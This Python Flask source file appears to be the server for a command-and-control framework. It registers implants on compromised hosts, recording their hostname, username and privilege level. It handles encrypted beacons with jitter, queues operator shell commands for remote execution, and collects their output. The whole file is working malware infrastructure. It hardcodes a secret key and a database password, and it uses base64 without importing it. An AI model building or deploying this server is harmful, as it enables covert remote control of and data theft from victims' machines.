#!/usr/bin/env python3
from flask import Flask, request, jsonify, session
from flask_socketio import SocketIO, emit
from flask_cors import CORS
from datetime import datetime
import uuid
import json
import logging
import os
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from server.models import db, Agent, Task, Listener
from modules.crypto import C2Crypto

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'c2_secret_key_change_me'
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://c2user:C2StrongPass123!@localhost/c2_framework'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db.init_app(app)
socketio = SocketIO(app, cors_allowed_origins="*")
CORS(app)

# Initialize crypto
crypto = C2Crypto()
server_private_key, server_public_key = crypto.generate_rsa_keypair()

# Save server public key for agents
with open('ssl/server_public_key.pem', 'wb') as f:
    f.write(server_public_key)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/api/implant/config', methods=['GET'])
def get_implant_config():
    """Provide initial configuration for implants"""
    config = {
        'server_public_key': base64.b64encode(server_public_key).decode(),
        'beacon_intervals': [5, 10, 15, 20, 30],
        'jitter_range': [10, 30],
        'killed_domains': []
    }
    return jsonify(config)

@app.route('/api/register', methods=['POST'])
def register_agent():
    """Initial agent registration"""
    try:
        data = request.json
        agent_id = str(uuid.uuid4())[:8]
        
        # Decrypt initial handshake
        encrypted_session_key = data.get('session_key')
        session_key = crypto.decrypt_session_key(encrypted_session_key, server_private_key)
        
        # Store agent session key
        crypto.session_keys[agent_id] = session_key
        
        # Decrypt agent info
        encrypted_info = data.get('agent_info')
        agent_info = json.loads(crypto.aes_decrypt(encrypted_info, session_key))
        
        # Create agent record
        agent = Agent(
            agent_id=agent_id,
            hostname=agent_info.get('hostname'),
            username=agent_info.get('username'),
            os_type=agent_info.get('os_type'),
            os_version=agent_info.get('os_version'),
            architecture=agent_info.get('architecture'),
            ip_address=request.remote_addr,
            encryption_key=base64.b64encode(session_key).decode(),
            working_directory=agent_info.get('working_dir', '/'),
            privilege_level=agent_info.get('privilege_level', 'user')
        )
        
        db.session.add(agent)
        db.session.commit()
        
        logger.info(f"New agent registered: {agent_id} from {agent.hostname}")
        
        return jsonify({
            'status': 'success',
            'agent_id': agent_id,
            'message': 'Agent registered successfully'
        })
        
    except Exception as e:
        logger.error(f"Registration error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/api/beacon', methods=['POST'])
def handle_beacon():
    """Handle agent beaconing"""
    try:
        data = request.json
        agent_id = data.get('agent_id')
        encrypted_data = data.get('data')
        
        # Get agent's session key
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
        
        session_key = base64.b64decode(agent.encryption_key)
        
        # Decrypt beacon data
        beacon_data = json.loads(crypto.aes_decrypt(encrypted_data, session_key))
        
        # Update agent last seen
        agent.last_seen = datetime.utcnow()
        agent.status = 'active'
        
        # Update system info if changed
        if 'working_dir' in beacon_data:
            agent.working_directory = beacon_data['working_dir']
        
        db.session.commit()
        
        # Check for pending tasks
        pending_tasks = Task.query.filter_by(
            agent_id=agent_id, 
            status='pending'
        ).all()
        
        tasks_to_send = []
        for task in pending_tasks:
            tasks_to_send.append({
                'task_id': task.task_id,
                'command': task.command,
                'type': task.command_type
            })
            task.status = 'sent'
            task.executed_at = datetime.utcnow()
        
        db.session.commit()
        
        # Send response with tasks
        response_data = {
            'status': 'ok',
            'sleep_time': agent.sleep_time,
            'jitter': agent.jitter,
            'tasks': tasks_to_send
        }
        
        encrypted_response = crypto.aes_encrypt(json.dumps(response_data), session_key)
        
        return jsonify({
            'agent_id': agent_id,
            'data': encrypted_response
        })
        
    except Exception as e:
        logger.error(f"Beacon error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/api/task_result', methods=['POST'])
def receive_task_result():
    """Receive task execution results from agent"""
    try:
        data = request.json
        agent_id = data.get('agent_id')
        encrypted_data = data.get('data')
        
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        session_key = base64.b64decode(agent.encryption_key)
        
        result_data = json.loads(crypto.aes_decrypt(encrypted_data, session_key))
        
        task = Task.query.filter_by(task_id=result_data['task_id']).first()
        if task:
            task.status = result_data['status']
            task.output = result_data.get('output', '')
            task.completed_at = datetime.utcnow()
            db.session.commit()
            
            # Emit to WebSocket for real-time updates
            socketio.emit('task_complete', {
                'agent_id': agent_id,
                'task_id': result_data['task_id'],
                'output': result_data.get('output', '')
            })
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"Task result error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/api/listeners', methods=['GET', 'POST'])
def manage_listeners():
    """Manage C2 listeners"""
    if request.method == 'GET':
        listeners = Listener.query.all()
        return jsonify([{
            'name': l.name,
            'type': l.type,
            'host': l.host,
            'port': l.port,
            'status': l.status
        } for l in listeners])
    
    elif request.method == 'POST':
        data = request.json
        listener = Listener(
            name=data['name'],
            type=data['type'],
            host=data['host'],
            port=data['port'],
            config=data.get('config', {})
        )
        db.session.add(listener)
        db.session.commit()
        return jsonify({'status': 'success', 'message': 'Listener created'})

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection from console"""
    logger.info(f"Operator connected: {request.sid}")

@socketio.on('send_command')
def handle_command(data):
    """Send command to specific agent"""
    try:
        agent_id = data['agent_id']
        command = data['command']
        
        task_id = str(uuid.uuid4())[:8]
        task = Task(
            task_id=task_id,
            agent_id=agent_id,
            command=command,
            command_type='shell',
            status='pending'
        )
        db.session.add(task)
        db.session.commit()
        
        emit('command_sent', {
            'task_id': task_id,
            'agent_id': agent_id,
            'command': command
        })
        
    except Exception as e:
        emit('error', {'message': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    
    # Generate SSL certificate for HTTPS
    os.system('openssl req -x509 -newkey rsa:4096 -nodes -out ssl/cert.pem -keyout ssl/key.pem -days 365 -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"')
    
    # Start server with HTTPS
    socketio.run(app, host='0.0.0.0', port=443, ssl_context=('ssl/cert.pem', 'ssl/key.pem'))
